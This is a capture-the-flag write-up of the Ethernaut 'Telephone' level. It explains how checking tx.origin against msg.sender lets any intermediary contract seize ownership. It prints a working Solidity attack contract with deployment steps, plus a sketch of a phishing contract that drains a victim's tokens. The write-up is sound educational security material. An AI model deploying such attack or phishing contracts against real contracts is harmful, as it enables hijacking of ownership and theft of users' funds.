# Level 4: Telephone

**Difficulty:** Easy

**Vulnerability:** Misuse of `tx.origin` for authorization

## How it Works

The contract has one function that changes the owner:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

The condition `tx.origin != msg.sender` was likely intended as a security check but it actually does the opposite of what the developer intended.

## `tx.origin` vs `msg.sender`

These are two different ways to get a sender's address in Solidity:

`tx.origin` is the human wallet that started the whole transaction. `msg.sender` is whoever directly called this function right now.

When calling a contract directly from a wallet, both are the same. But when a middleman contract calls another contract:

```
My wallet → Contract A → Contract B
```

Inside Contract B:
`tx.origin` = my wallet (the original human)
`msg.sender` = Contract A (the direct caller)

So `tx.origin != msg.sender` is really asking: did this call come through a middleman contract?

The developer blocked direct wallet calls but accidentally allowed calls through any middleman contract, which anyone can deploy.

## Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    function attack() public {
        ITelephone(0xd79bFA3bDe335e8191e985781C64cE4d47E4a55a).changeOwner(msg.sender);
    }
}
```

When `attack()` is called:
`tx.origin` = my wallet (started the transaction)
`msg.sender` inside `changeOwner` = the `TelephoneAttack` contract (direct caller)
They're different, so the condition passes and ownership transfers to my wallet.

## Exploit Steps

1. Deploy `TelephoneAttack` in Remix using Injected Provider (MetaMask on Sepolia)
   Make sure to select `TelephoneAttack` in the contract dropdown, not `ITelephone`
2. Call `attack()`
3. Confirm ownership changed in the Ethernaut console:
```js
await contract.owner()  // should return your wallet address
```
4. Submit the instance

## The Real Danger: Phishing with `tx.origin`

This level is a simple example but the same bug can be used for a much sneakier attack. Imagine a token contract that uses `tx.origin` to decide whose tokens to deduct:

```solidity
function transfer(address _to, uint _value) {
    tokens[tx.origin] -= _value;
    tokens[_to] += _value;
}
```

An attacker deploys a malicious contract that looks harmless, maybe disguised as a free NFT giveaway. The victim sends ETH to it. The moment it receives the ETH, its fallback function secretly calls the token contract:

```solidity
function() payable {
    token.transfer(attackerAddress, 10000);
}
```

Inside `transfer`, `tx.origin` is the victim's wallet since they started the transaction. So 10000 tokens get deducted from the victim and sent to the attacker. The victim never intended to transfer tokens. They just sent ETH to what looked like a harmless contract and had no idea a token transfer was happening behind the scenes.

If the token contract used `msg.sender` instead, it would try to deduct from the malicious contract's balance which is zero, so the transfer would fail. The victim would be safe.

## Key Takeaway

`tx.origin != msg.sender` is not a security check. It just checks whether a middleman contract is involved, and anyone can deploy one.

Never use `tx.origin` for authorization. Always use `msg.sender`. `tx.origin` tells you who started the chain, not who is actually calling the function right now. A malicious contract can sit in the middle, trigger actions on the victim's behalf, and the victim may not even realize it happened.

**Vulnerability category:** Access Control / `tx.origin` Misuse
